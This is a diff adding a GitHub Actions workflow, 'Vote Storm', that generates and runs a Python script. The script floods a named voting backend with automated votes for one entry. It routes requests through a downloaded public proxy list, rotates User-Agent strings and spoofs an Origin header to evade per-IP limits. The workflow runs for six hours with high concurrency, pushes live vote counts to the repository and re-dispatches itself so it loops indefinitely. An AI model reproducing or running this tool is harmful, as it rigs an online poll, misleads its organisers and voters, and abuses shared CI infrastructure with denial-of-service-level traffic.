@@ -1,0 +1,297 @@
+name: "Vote Storm - Single Source Proxies"
+
+on:
+  workflow_dispatch:
+    inputs:
+      concurrency:
+        description: 'Concurrent connections'
+        required: true
+        default: '60'
+
+jobs:
+  vote-infinite:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          persist-credentials: true
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: pip install aiohttp aiohttp_socks
+
+      - name: Create Python script
+        run: |
+          cat << 'PYEOF' > infinite_voter.py
+          import aiohttp
+          import asyncio
+          import json
+          import random
+          import time
+          import re
+          import os
+          from aiohttp_socks import ProxyConnector, ProxyType
+          from urllib.parse import urlparse
+
+          API_URL = "https://voting-backend.shayan-farid-pc.workers.dev/api/vote"
+          VOTE_DATA = {"id": 1}
+          PROXY_URL = "https://raw.githubusercontent.com/RaptorKingdom/Santos/refs/heads/main/proxies.txt"
+
+          USER_AGENTS = [
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
+              "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
+          ]
+
+          async def fetch_text(session, url):
+              try:
+                  async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+                      return await resp.text()
+              except:
+                  return ""
+
+          async def gather_proxies():
+              proxies = set()
+              async with aiohttp.ClientSession() as session:
+                  text = await fetch_text(session, PROXY_URL)
+                  if not text:
+                      return []
+                  for line in text.splitlines():
+                      line = line.strip()
+                      if not line or line.startswith('#'):
+                          continue
+                      # Keep lines with or without prefix
+                      proxies.add(line)
+              # Remove invalid local IPs
+              clean = set()
+              for p in proxies:
+                  # Extract ip:port
+                  match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)', p)
+                  if match:
+                      ip = match.group(1)
+                      if ip.startswith(("127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "0.", "169.254.")):
+                          continue
+                      clean.add(p)
+              return list(clean)
+
+          def get_proxy_type_and_url(proxy_str):
+              if proxy_str.startswith("socks5://"):
+                  return ProxyType.SOCKS5, proxy_str
+              elif proxy_str.startswith("socks4://"):
+                  return ProxyType.SOCKS4, proxy_str
+              elif proxy_str.startswith("http://"):
+                  return ProxyType.HTTP, proxy_str
+              elif proxy_str.startswith("https://"):
+                  return ProxyType.HTTP, proxy_str
+              else:
+                  # Assume plain IP:port -> try HTTP
+                  return ProxyType.HTTP, f"http://{proxy_str}"
+
+          async def vote(session, proxy_str, sem, stats):
+              async with sem:
+                  headers = {
+                      "Origin": "https://mehdijahaan.com",
+                      "Content-Type": "application/json",
+                      "User-Agent": random.choice(USER_AGENTS),
+                  }
+                  try:
+                      ptype, purl = get_proxy_type_and_url(proxy_str)
+                      parsed = urlparse(purl)
+                      connector = ProxyConnector(
+                          proxy_type=ptype,
+                          host=parsed.hostname,
+                          port=parsed.port,
+                          rdns=True
+                      )
+                      async with aiohttp.ClientSession(connector=connector) as proxy_session:
+                          async with proxy_session.post(
+                              API_URL,
+                              data=json.dumps(VOTE_DATA),
+                              headers=headers,
+                              timeout=aiohttp.ClientTimeout(total=4)
+                          ) as resp:
+                              status = resp.status
+                              text = await resp.text()
+                              if status == 200:
+                                  data = json.loads(text)
+                                  if data.get("success"):
+                                      stats['success'] += 1
+                                      return True
+                              stats['failed'] += 1
+                              return False
+                  except:
+                      stats['failed'] += 1
+                      return False
+
+          async def heartbeat():
+              while True:
+                  await asyncio.sleep(120)
+                  print(f"Heartbeat: alive - {time.strftime('%Y-%m-%d %H:%M:%S')}")
+
+          async def update_stats_files(stats, proxy_count, start_time):
+              while True:
+                  await asyncio.sleep(300)
+                  elapsed = time.time() - start_time
+                  total = stats['success'] + stats['failed']
+                  rate = total / elapsed if elapsed > 0 else 0
+                  success_rate = (stats['success'] / total * 100) if total > 0 else 0
+
+                  data = {
+                      "success": stats['success'],
+                      "failed": stats['failed'],
+                      "total": total,
+                      "rate": round(rate, 2),
+                      "success_rate": round(success_rate, 1),
+                      "runtime_seconds": round(elapsed),
+                      "proxy_count": proxy_count,
+                      "last_updated": time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
+                  }
+                  with open("stats.json", "w") as f:
+                      json.dump(data, f, indent=2)
+
+                  readme = f"""# Vote Storm Stats (Single Source)
+
+**Last updated:** {data['last_updated']}  
+**Runtime:** {elapsed/3600:.1f} hours  
+
+| Metric | Value |
+|--------|-------|
+| ✅ Successful votes | **{stats['success']:,}** |
+| ❌ Failed attempts | {stats['failed']:,} |
+| 📝 Total requests | {total:,} |
+| 📈 Success rate | {success_rate:.1f}% |
+| ⚡ Speed | {rate:.2f} req/s |
+| 🔁 Proxies loaded | {proxy_count:,} |
+
+> Proxies from: {PROXY_URL}  
+> Auto-updated every 5 minutes.
+"""
+                  with open("README.md", "w") as f:
+                      f.write(readme)
+
+                  print("Stats files updated.")
+
+          async def main():
+              concurrency = int(os.getenv("CONCURRENCY", 60))
+
+              print("Starting vote storm (single proxy source)")
+              print(f"Origin: https://mehdijahaan.com")
+              print(f"Concurrency: {concurrency}")
+              print(f"Proxy source: {PROXY_URL}")
+              print("Max runtime: 6 hours\n")
+
+              start_time = time.time()
+              max_runtime = 6 * 3600 - 120
+
+              print("Fetching proxies...")
+              proxy_list = await gather_proxies()
+              proxy_count = len(proxy_list)
+              print(f"Proxies loaded: {proxy_count:,}\n")
+
+              if not proxy_list:
+                  print("No proxies found!")
+                  return
+
+              stats = {'success': 0, 'failed': 0}
+              sem = asyncio.Semaphore(concurrency)
+
+              heart_task = asyncio.create_task(heartbeat())
+              updater_task = asyncio.create_task(update_stats_files(stats, proxy_count, start_time))
+
+              tasks = []
+              proxy_index = 0
+
+              while (time.time() - start_time) < max_runtime:
+                  proxy = proxy_list[proxy_index % proxy_count]
+                  proxy_index += 1
+
+                  task = asyncio.create_task(vote(None, proxy, sem, stats))
+                  tasks.append(task)
+
+                  if len(tasks) >= concurrency * 2:
+                      done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+                      tasks = list(pending)
+
+                  await asyncio.sleep(0.01)
+
+              heart_task.cancel()
+              updater_task.cancel()
+
+              if tasks:
+                  await asyncio.wait(tasks, timeout=30)
+
+              elapsed = time.time() - start_time
+              total = stats['success'] + stats['failed']
+              print(f"\nDone. Success: {stats['success']:,}, Failed: {stats['failed']:,}, Total: {total:,}, Time: {elapsed/3600:.1f}h")
+
+              # Final save
+              with open("stats.json", "w") as f:
+                  json.dump({
+                      "success": stats['success'],
+                      "failed": stats['failed'],
+                      "total": total,
+                      "rate": round(total/elapsed, 2),
+                      "success_rate": round((stats['success']/total*100), 1) if total else 0,
+                      "runtime_seconds": round(elapsed),
+                      "proxy_count": proxy_count,
+                      "last_updated": time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
+                  }, f, indent=2)
+
+              with open("README.md", "w") as f:
+                  f.write(f"# Final Stats\n\nSuccess: {stats['success']:,}\nFailed: {stats['failed']:,}\nTotal: {total:,}\nTime: {elapsed/3600:.1f}h")
+
+          if __name__ == "__main__":
+              asyncio.run(main())
+          PYEOF
+
+      - name: Run voter with auto-commit
+        env:
+          CONCURRENCY: ${{ github.event.inputs.concurrency }}
+        run: |
+          git config user.name "github-actions"
+          git config user.email "github-actions@github.com"
+
+          while true; do
+            sleep 300
+            git add README.md stats.json
+            if ! git diff --staged --quiet; then
+              git commit -m "📊 Update live stats [skip ci]"
+              git push
+            fi
+          done &
+          BG_PID=$!
+
+          python infinite_voter.py
+
+          kill $BG_PID 2>/dev/null
+          git add README.md stats.json
+          if ! git diff --staged --quiet; then
+            git commit -m "📊 Final stats [skip ci]"
+            git push
+          fi
+
+  auto-restart:
+    needs: vote-infinite
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      - name: Trigger next run
+        run: |
+          curl -X POST \
+            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/b.yml/dispatches" \
+            -d '{"ref":"${{ github.ref }}", "inputs":{"concurrency":"${{ github.event.inputs.concurrency }}"}}'
